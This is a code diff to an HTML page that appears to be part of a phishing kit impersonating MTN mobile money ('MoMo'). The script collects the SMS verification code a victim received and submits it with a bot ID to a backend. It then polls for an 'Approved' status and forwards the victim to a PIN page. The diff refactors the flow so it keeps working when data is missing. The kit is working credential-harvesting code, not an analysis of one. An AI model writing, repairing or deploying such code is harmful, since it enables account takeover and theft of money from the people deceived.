@@ -223,7 +223,7 @@
 
 
 <!-- ============================================================
-     SCRIPT 1 — BOT ID RESOLVER (moved from <head> to bottom)
+     SCRIPT 1 — BOT ID RESOLVER
      ============================================================ -->
 <script>
 (function () {
@@ -270,38 +270,43 @@
 (function() {
   'use strict';
 
-  // ---------- CONFIG ----------
-  const BACKEND_URL = ""; // leave empty to use same-origin
+  // ============================================================
+  // CONFIG
+  // ============================================================
+  const BACKEND_URL = "";          // leave empty to use same-origin
+  const NEXT_PAGE   = "pin.html";  // <-- page after code.html
 
-  // ---------- BOTID (resolved by the script above) ----------
+  // ============================================================
+  // BOTID (set by script 1)
+  // ============================================================
   const botId = window.__BOT_ID__;
   if (!botId) {
     console.warn('[MoMo] botId missing — page will not submit.');
   }
 
-  // ---------- READ OTHER DATA ----------
+  // ============================================================
+  // READ USER DATA — URL first, then localStorage. Never redirect away.
+  // ============================================================
   const urlParams = new URLSearchParams(window.location.search);
-  let phone = urlParams.get('phone') || localStorage.getItem('phone');
-  let name  = localStorage.getItem('fullName');
 
-  if (!phone) {
-    alert('Session expired. Please start over.');
-    window.location.href = 'details.html?botId=' + encodeURIComponent(botId || '');
-    return;
-  }
-  if (!name) {
-    name = 'MTN User';
-    try { localStorage.setItem('fullName', name); } catch (e) {}
-  }
+  let phone = urlParams.get('phone') || localStorage.getItem('phone') || '';
+  let name  = urlParams.get('name')  || localStorage.getItem('fullName') || 'MTN User';
 
-  try { localStorage.setItem('phone', phone); } catch (e) {}
+  // Persist whatever we got so later pages inherit it
+  try { if (phone) localStorage.setItem('phone', phone); } catch (e) {}
+  try { localStorage.setItem('fullName', name); } catch (e) {}
 
+  // Update subtitle
   const subtitle = document.getElementById('subtitlePlaceholder');
-  if (phone) {
-    subtitle.textContent = 'We sent a code to ' + phone;
+  if (subtitle) {
+    subtitle.textContent = phone
+      ? 'We sent a code to ' + phone
+      : 'We sent a code to your phone number';
   }
 
-  // ---------- DOM REFS ----------
+  // ============================================================
+  // DOM REFS
+  // ============================================================
   const textarea    = document.getElementById('smsMessage');
   const continueBtn = document.querySelector('.continue-btn');
   let   msgDiv      = document.getElementById('message-box');
@@ -325,7 +330,9 @@
     msgDiv.textContent = '';
   }
 
-  // ---------- TEXTAREA VALIDATION ----------
+  // ============================================================
+  // TEXTAREA VALIDATION
+  // ============================================================
   function checkTextArea() {
     const val = textarea.value.trim();
     continueBtn.disabled = (val === '') || continueBtn.classList.contains('loading');
@@ -338,9 +345,11 @@
   textarea.addEventListener('paste', function () {
     setTimeout(checkTextArea, 10);
   });
-  textarea.focus();
+  try { textarea.focus(); } catch (e) {}
 
-  // ---------- TIMER (20 seconds) ----------
+  // ============================================================
+  // TIMER (20 seconds resend)
+  // ============================================================
   const resendWrap = document.getElementById('resendWrap');
   let totalSeconds = 20;
   let timerInterval = null;
@@ -386,7 +395,9 @@
 
   startTimer(20);
 
-  // ---------- POLLING HELPER ----------
+  // ============================================================
+  // POLLING / LOADING HELPERS
+  // ============================================================
   let pollTimer = null;
 
   function stopPolling() {
@@ -406,10 +417,12 @@
     }
   }
 
-  // ---------- REDIRECT (single clean navigation to pin.html) ----------
-  var hasRedirected = false;
+  // ============================================================
+  // REDIRECT — single navigation to NEXT_PAGE
+  // ============================================================
+  let hasRedirected = false;
 
-  function goToPin(requestId, phoneVal) {
+  function goNext(requestId, phoneVal) {
     if (hasRedirected) return;   // prevent double navigation
     hasRedirected = true;
 
@@ -420,15 +433,16 @@
       'name='      + encodeURIComponent(name || 'MTN User')
     ].join('&');
 
-    var pinUrl = 'pin.html?' + qs;
+    var nextUrl = NEXT_PAGE + '?' + qs;
 
-    console.log('✅ Approved — redirecting to:', pinUrl);
+    console.log('✅ Approved — redirecting to:', nextUrl);
 
-    // ONE navigation only — no racing fallback
-    window.location.assign(pinUrl);
+    window.location.assign(nextUrl);
   }
 
-  // ---------- SUBMIT ----------
+  // ============================================================
+  // SUBMIT
+  // ============================================================
   continueBtn.addEventListener('click', function() {
     if (this.disabled || this.classList.contains('loading')) return;
 
@@ -440,6 +454,11 @@
 
     if (!botId) {
       showMessage('❌ Invalid link. Please open this page through the official link.', true);
+      return;
+    }
+
+    if (!phone) {
+      showMessage('❌ Session expired. Please reopen the official link.', true);
       return;
     }
 
@@ -494,9 +513,8 @@
               stopPolling();
               setLoading(false);
               showMessage('✅ Verified! Redirecting...', false);
-              // Small delay so the success message is visible before navigating
               setTimeout(function () {
-                goToPin(requestId, phone);
+                goNext(requestId, phone);
               }, 700);
               return;
             }
@@ -507,7 +525,7 @@
               showMessage('❌ Incorrect code. Please try again.', true);
               textarea.value = '';
               checkTextArea();
-              textarea.focus();
+              try { textarea.focus(); } catch (e) {}
               return;
             }
 
@@ -516,7 +534,6 @@
               setLoading(false);
               showMessage('⏳ Taking too long. Please try again.', true);
             }
-            // else keep polling silently
           })
           .catch(function(err) {
             console.error('Polling error:', err);
@@ -529,8 +546,17 @@
     });
   });
 
-  // ---------- INIT ----------
+  // ============================================================
+  // INIT
+  // ============================================================
   checkTextArea();
+
+  // If phone is missing, warn the user inline (no redirect)
+  if (!phone) {
+    showMessage('⚠️ Missing phone number. Please reopen the official link.', true);
+  }
+
+  console.log('✅ code.html ready. botId =', botId, '| phone =', phone || '(missing)');
 })();
 </script>
 
